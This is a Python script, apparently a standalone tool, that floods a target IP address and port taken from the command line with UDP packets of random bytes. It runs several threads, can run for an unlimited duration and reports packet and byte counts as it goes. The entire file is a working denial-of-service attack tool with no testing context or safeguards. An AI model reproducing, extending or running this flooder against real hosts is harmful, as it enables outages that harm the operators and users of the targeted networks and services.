import os
import sys
import time
import socket
import random
from threading import Thread
from datetime import datetime


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

config = {
    'duration': 5,  # seconds
    'packet-len': 1024,  # bytes
    'ip': '127.0.0.1',
    'port': 3030,
    'timeout': 0,
    'threads': 10,
    'total_packets_sent': 0,
    'total_bytes_sent': 0,
    'begin': time.time()
}


def start():
    try:
        while config['duration'] == 'inf' or config['begin'] + int(config['duration']) > time.time():
            try:
                sock.sendto(random._urandom(int(config['packet-len'])), (config['ip'], int(config['port'])))
            except OSError:
                continue
            config['total_packets_sent'] += 1
            config['total_bytes_sent'] += int(config['packet-len'])
            print('[{time_went} SECS] Sent {packets} packets to {ip}:{port}. Bytes sent: {total_packets_len}'.format(
                                                                        packets=config['total_packets_sent'],
                                                                        ip=config['ip'],
                                                                        port=config['port'],
                                                                        total_packets_len=config['total_bytes_sent'],
                                                                        time_went=int(time.time() - config['begin'])))
            time.sleep(int(config['timeout']))
    except BrokenPipeError:
        print('[ERROR] Router has closed the connection')

    else:
        print('Timeout has been reached')

    os.abort()


if __name__ == '__main__':
    args = sys.argv[1:]
    config['ip'], config['port'] = args[:2]

    arg = 'null'

    try:
        for arg in config.keys():
            if '--' + arg in args:
                config[arg] = args[args.index('--' + arg) + 1]
    except IndexError:
        print('[ERROR] Missing value for --' + arg)

    try:
        config['begin'] = time.time()

        threads = []

        for _ in range(int(config['threads'])):
            threads.append(Thread(target=start))

        for thread in threads:
            thread.start()
    except KeyboardInterrupt:
        print('\nQuit')
        os.abort()

